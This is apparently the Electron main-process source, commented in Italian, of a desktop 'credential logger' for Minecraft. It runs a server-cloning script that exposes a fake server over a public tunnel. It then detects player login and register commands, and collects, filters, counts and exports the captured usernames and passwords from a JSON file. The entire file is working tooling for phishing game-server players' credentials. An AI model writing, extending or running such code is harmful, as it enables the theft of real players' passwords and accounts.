const { app, BrowserWindow, ipcMain, dialog, shell } = require('electron');
const path = require('path');
const fs = require('fs');
const { spawn } = require('child_process');

class CredentialLoggerApp {
    constructor() {
        this.mainWindow = null;
        this.clonerProcess = null;
        this.setupIPCHandlers();
    }

    createWindow() {
        this.mainWindow = new BrowserWindow({
            width: 1200,
            height: 800,
            minWidth: 900,
            minHeight: 600,
            icon: path.join(__dirname, 'assets/Logo.png'),
            webPreferences: {
                nodeIntegration: true,
                contextIsolation: false,
                enableRemoteModule: true
            },
            titleBarStyle: 'hidden',
            frame: false,
            show: false,
            backgroundColor: '#1a1a1a'
        });

        this.mainWindow.loadFile('renderer/index.html');

        // Mostra la finestra quando è pronta
        this.mainWindow.once('ready-to-show', () => {
            this.mainWindow.show();
        });

        // DevTools in modalità dev
        if (process.argv.includes('--dev')) {
            this.mainWindow.webContents.openDevTools();
        }

        this.mainWindow.on('closed', () => {
            this.mainWindow = null;
            this.cleanup();
        });
    }

    setupIPCHandlers() {
        // Controlli finestra
        ipcMain.handle('window-minimize', () => {
            this.mainWindow?.minimize();
        });

        ipcMain.handle('window-maximize', () => {
            if (this.mainWindow?.isMaximized()) {
                this.mainWindow.unmaximize();
            } else {
                this.mainWindow?.maximize();
            }
        });

        ipcMain.handle('window-close', () => {
            this.cleanup();
            app.quit();
        });

        // Funzioni del cloner
        ipcMain.handle('start-cloner', async (event, serverHost, serverPort) => {
            return this.startCloner(serverHost, serverPort);
        });

        ipcMain.handle('stop-cloner', async () => {
            return this.stopCloner();
        });

        ipcMain.handle('get-credentials', async () => {
            return this.getCredentials();
        });

        ipcMain.handle('clear-credentials', async () => {
            return this.clearCredentials();
        });

        ipcMain.handle('export-credentials', async () => {
            return this.exportCredentials();
        });

        ipcMain.handle('get-server-info', async (event, serverHost, serverPort) => {
            return this.getServerInfo(serverHost, serverPort);
        });
    }

    async startCloner(serverHost, serverPort) {
        try {
            if (this.clonerProcess) {
                this.stopCloner();
            }

            this.clonerProcess = spawn('node', ['minecraft-cloner.js', serverHost, serverPort], {
                cwd: __dirname,
                stdio: ['pipe', 'pipe', 'pipe']
            });

            let output = '';
            let publicUrl = '';

            this.clonerProcess.stdout.on('data', (data) => {
                const text = data.toString();
                output += text;
                
                // Invia output in tempo reale al renderer
                this.mainWindow?.webContents.send('cloner-output', text);

                // Estrai URL pubblico
                const urlMatch = text.match(/📡 INDIRIZZO PUBBLICO: (.+)/);
                if (urlMatch) {
                    publicUrl = urlMatch[1].trim();
                    this.mainWindow?.webContents.send('public-url', publicUrl);
                }

                // Estrai info server dall'output
                const versionMatch = text.match(/Versione: (.+)/);
                if (versionMatch) {
                    this.mainWindow?.webContents.send('server-info-update', {
                        version: versionMatch[1].trim()
                    });
                }

                const playersMatch = text.match(/Giocatori: (.+)/);
                if (playersMatch) {
                    this.mainWindow?.webContents.send('server-info-update', {
                        players: playersMatch[1].trim()
                    });
                }

                // Estrai stato del server
                if (text.includes('✅ Server rilevato con successo!')) {
                    this.mainWindow?.webContents.send('server-status', 'connected');
                }

                if (text.includes('🎉 TUNNEL PUBBLICO ATTIVO!')) {
                    this.mainWindow?.webContents.send('tunnel-status', 'active');
                }

                // Rileva nuove credenziali con pattern multipli
                if (text.includes('🔥 CREDENZIALE CATTURATA!') || 
                    text.includes('COMANDO LOGIN:') || 
                    text.includes('COMANDO REGISTER:') ||
                    text.includes('📝 COMANDO')) {
                    
                    console.log('🔄 Credenziali aggiornate - notifica al renderer');
                    
                    // Notifica immediata + ritardata per essere sicuri
                    this.mainWindow?.webContents.send('credentials-updated');
                    setTimeout(() => {
                        this.mainWindow?.webContents.send('credentials-updated');
                    }, 1000);
                }
            });

            this.clonerProcess.stderr.on('data', (data) => {
                const error = data.toString();
                this.mainWindow?.webContents.send('cloner-error', error);
            });

            this.clonerProcess.on('close', (code) => {
                this.mainWindow?.webContents.send('cloner-stopped', code);
                this.clonerProcess = null;
            });

            return { success: true, message: 'Cloner avviato con successo' };

        } catch (error) {
            return { success: false, message: error.message };
        }
    }

    stopCloner() {
        if (this.clonerProcess) {
            this.clonerProcess.kill('SIGTERM');
            this.clonerProcess = null;
            
            // Termina anche processi Java
            const killJava = spawn('taskkill', ['/f', '/im', 'java.exe'], { stdio: 'ignore' });
            killJava.on('close', () => {
                const killJavaw = spawn('taskkill', ['/f', '/im', 'javaw.exe'], { stdio: 'ignore' });
            });

            return { success: true, message: 'Cloner fermato' };
        }
        return { success: false, message: 'Nessun processo attivo' };
    }

    async getCredentials() {
        try {
            const credPath = path.join(__dirname, 'captured_credentials.json');
            if (fs.existsSync(credPath)) {
                const data = fs.readFileSync(credPath, 'utf8');
                const rawData = JSON.parse(data);
                
                // Se è un array diretto (formato vecchio), convertilo
                const credentials = Array.isArray(rawData) ? rawData : rawData.credentials || [];
                
                // Filtra solo credenziali con password
                const validCredentials = credentials.filter(cred => 
                    cred.password && (cred.type?.includes('login') || cred.type?.includes('register'))
                );
                
                const stats = {
                    total: validCredentials.length,
                    unique_users: [...new Set(validCredentials.map(c => c.nickname || c.username))].length,
                    connections: credentials.filter(c => c.type === 'connection').length
                };
                
                return { 
                    credentials: validCredentials.reverse(), // Mostra i più recenti prima
                    stats 
                };
            }
            return { credentials: [], stats: { total: 0, unique_users: 0, connections: 0 } };
        } catch (error) {
            return { credentials: [], stats: { total: 0, unique_users: 0, connections: 0 }, error: error.message };
        }
    }

    async clearCredentials() {
        try {
            const credPath = path.join(__dirname, 'captured_credentials.json');
            const emptyData = {
                credentials: [],
                stats: { total: 0, unique_users: 0, connections: 0 }
            };
            fs.writeFileSync(credPath, JSON.stringify(emptyData, null, 2));
            return { success: true, message: 'Credenziali cancellate' };
        } catch (error) {
            return { success: false, message: error.message };
        }
    }

    async exportCredentials() {
        try {
            const result = await dialog.showSaveDialog(this.mainWindow, {
                title: 'Esporta Credenziali',
                defaultPath: 'credentials_export.json',
                filters: [
                    { name: 'JSON Files', extensions: ['json'] },
                    { name: 'Text Files', extensions: ['txt'] }
                ]
            });

            if (!result.canceled) {
                const credentials = await this.getCredentials();
                fs.writeFileSync(result.filePath, JSON.stringify(credentials, null, 2));
                return { success: true, message: 'Credenziali esportate' };
            }
            return { success: false, message: 'Esportazione annullata' };
        } catch (error) {
            return { success: false, message: error.message };
        }
    }

    async getServerInfo(serverHost, serverPort) {
        return new Promise((resolve) => {
            const mc = require('minecraft-protocol');
            
            // Usa direttamente minecraft-protocol invece di spawn
            mc.ping({
                host: serverHost,
                port: serverPort,
                version: '1.21.1'
            }).then(data => {
                resolve({
                    version: data.version,
                    players: data.players,
                    description: data.description,
                    favicon: data.favicon
                });
            }).catch(err => {
                resolve({ error: err.message });
            });
        });
    }

    cleanup() {
        if (this.clonerProcess) {
            this.clonerProcess.kill();
        }
    }
}

// Inizializzazione app
const credLoggerApp = new CredentialLoggerApp();

app.whenReady().then(() => {
    credLoggerApp.createWindow();
});

app.on('window-all-closed', () => {
    credLoggerApp.cleanup();
    if (process.platform !== 'darwin') {
        app.quit();
    }
});

app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) {
        credLoggerApp.createWindow();
    }
});